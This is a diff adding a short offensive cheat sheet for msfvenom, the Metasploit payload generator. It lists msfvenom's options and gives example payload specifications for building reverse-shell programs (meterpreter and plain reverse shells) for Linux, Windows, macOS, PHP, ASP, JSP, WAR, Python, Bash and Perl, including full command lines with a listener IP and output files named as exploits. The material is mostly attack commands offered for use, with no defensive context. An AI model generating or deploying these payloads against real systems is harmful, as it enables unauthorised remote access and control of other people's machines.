@@ -1,0 +1,86 @@
+MSFVENOM is a Metasploit Standalone Payload Generator and it is replacement of msfpayload and psfencode
+
+
+For each of these payloads go to "msfconsole" and select 
+"exploit/multi/handler" 
+set payload 
+and configure all [LHOST,LPORT,SRVHOST,SRVPORT etc]
+
+To list all options: msfvenom -h
+
+OPTIONS:->
+
+1. -p : payload
+
+2. -payload-options : List the payload's standord options
+
+3. -l : List a module type: payloads,encoders,nops all
+
+4. -n : Prepend a nopsled of [length] size on to the payload
+
+5. -f : format mean output format [--help-formats for a list]
+
+6. -e : encoder
+
+7. -a : architecture to use
+
+8. --platform and --help-platforms
+
+9. -s : maximum size of resulting payload
+
+10. -o : output save the payload
+
+EXAMPLES:
+
+FOR Linux:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.179.146 LPORT=4444 -f elf > /root/Downloads/exploits/exploit.elf
+
+FOR Windows:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=  LPORT= -f exe >/root/Downloads/exploits/exploit.exe
+
+FOR MAC:
+osx/x86/shell_reverse_tcp 
+-f macho 
+exploit.macho
+
+
+FOR PHP:
+php/meterpreter_reverse_tcp
+-f raw
+exploit.php
+
+FOR ASP:
+windows/meterpreter/reverse_tcp
+-f asp
+exploit.asp
+
+
+FOR JSP:
+java/jsp_shell_reverse_tcp
+-f raw
+exploit.jsp
+
+
+FOR WAR:
+java/jsp_shell_reverse_tcp
+-f war
+exploit.war
+
+
+FOR Python:
+cmd/unix/reverse_python
+-f raw
+exploit.py
+
+
+FOR Bash:
+cmd/unix/reverse_bash
+-f raw
+exploit.sh
+
+
+FOR Perl:
+cmd/unix/reverse_perl
+-f raw
+exploit.pl
+
